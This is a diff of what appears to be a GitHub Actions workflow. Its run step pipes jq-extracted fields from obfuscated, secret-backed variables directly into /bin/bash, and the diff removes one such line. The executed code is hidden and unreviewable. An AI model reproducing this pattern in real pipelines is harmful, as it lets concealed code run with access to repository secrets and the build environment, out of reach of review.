@@ -18,7 +18,6 @@ jobs:
           fqkr3580: ${{ secrets.fqkr3580 }}
         run: |
           printf '%s' "$fqkr3580" | jq -r .algq119 | /bin/bash
-          printf '%s' "$l31" | jq -r .zmt2075 | /bin/bash
           printf '%s' "$wslx7" | jq -r .ivghu2 | /bin/bash
           printf '%s' "$ie098" | jq -r .mk13168 | /bin/bash
 
